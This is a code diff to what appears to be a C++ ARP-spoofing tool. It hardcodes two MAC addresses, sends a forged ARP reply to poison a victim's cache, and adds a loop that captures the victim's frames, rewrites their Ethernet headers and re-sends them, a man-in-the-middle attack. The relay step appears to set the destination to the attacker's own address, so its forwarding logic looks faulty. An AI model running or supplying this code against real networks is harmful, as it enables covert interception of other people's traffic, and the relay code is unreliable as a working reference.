@@ -124,10 +124,47 @@ int attack(char *dev, char *_target_ip, char *_sender_ip) {
   Ip target_ip = Ip(_target_ip);
   Ip sender_ip = Ip(_sender_ip);
   cout << "target: " << string(target_ip) << " sender: " << string(sender_ip) << '\n';
-  Mac sender_mac = get_mac_by_ip(handle, current_mac, current_ip, sender_ip);
-  cout << "sender mac: " << string(sender_mac) << '\n';
+  // Mac sender_mac = get_mac_by_ip(handle, current_mac, current_ip, sender_ip);
+  // Mac target_mac = get_mac_by_ip(handle, current_mac, current_ip, target_ip);
+  
+  Mac sender_mac = Mac("7C:10:C9:D2:82:96");
+  Mac target_mac = Mac("00:23:AA:79:8C:9C");
+
+  cout << "target_mac: " << string(target_mac) << " sender mac: " << string(sender_mac) << '\n';
   send_arp(handle, current_mac, sender_mac, current_mac, target_ip, sender_mac, sender_ip, ArpHdr::Reply);
   
+  while (true) {	
+    struct pcap_pkthdr* header;
+		const u_char* packet;
+    int res = pcap_next_ex(handle, &header, &packet);
+    if (res == 0) continue;
+		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
+			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
+			break;
+		}
+    EthHdr* spoof_packet = (EthHdr*) packet;
+    // sender from me
+    if (spoof_packet->smac_ == sender_mac && spoof_packet->dmac_ == current_mac) {
+      if (spoof_packet->type() == EthHdr::Ip4) {
+        printf("ipv4 ");
+      } else if (spoof_packet->type() == EthHdr::Arp) {
+        printf("arp ");
+      } else {
+        printf("unknown (%x) ", spoof_packet->type());
+      }
+      printf("packet from sender to me spoofed\n");
+      spoof_packet->dmac_ = current_mac;
+      spoof_packet->smac_ = target_mac;
+      int res = pcap_sendpacket(handle, packet, header->caplen);
+	    if (res != 0) {
+		    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+	    } else {
+        printf("packet relayed with %d bytes\n", header->caplen);
+      }
+    } else if (spoof_packet->smac_ == target_mac && spoof_packet->dmac_ == current_mac) {
+      printf("packet from target to me spoofed\n");
+    }
+	}
   pcap_close(handle);
 }
 
